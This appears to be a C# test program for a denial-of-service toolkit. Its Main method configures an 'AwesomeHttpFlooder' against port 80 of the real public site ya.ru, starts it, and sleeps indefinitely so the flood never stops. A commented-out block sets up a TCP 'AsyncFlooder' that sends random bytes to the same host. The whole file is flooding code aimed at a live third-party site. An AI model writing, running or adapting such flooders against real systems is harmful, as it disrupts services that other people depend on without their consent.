using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.AttackInformation;
using GAS.Core.Attacks;

namespace TestApp {
    class Program {
        static void Main( string[] args ) {
            var r = new FastRandom.FastRandom();
            //var f = new AsyncFlooder(
            //    new AttackInfo {
            //        Protocol = ProtocolType.Tcp,
            //        Target = new IPEndPoint(
            //            Dns.GetHostAddresses(
            //                "ya.ru"
            //            )[0],
            //            80
            //        ),
            //        Randomizer = (a,b)=>{
            //            r.NextBytes( a );
            //            return a.Length;
            //        },
            //        MaxRead = 0
            //    },
            //    1
            //);
            var f = new AwesomeHttpFlooder(
                new IPEndPoint(
                    Dns.GetHostAddresses( "ya.ru" )[ 0 ],
                    80 ),
                new HttpAttackParams() {
                    AttackType = HttpAttackType.Deafult,
                    Dns = "ya.ru",
                    Gzip = true,
                    Query = "/",
                    RandomAppendHost = false,
                    RandomAppendUrl = false,
                    WaitForResponse = true
                }
            );
            f.Start();
            Thread.Sleep(Timeout.InfiniteTimeSpan);
        }
    }
}
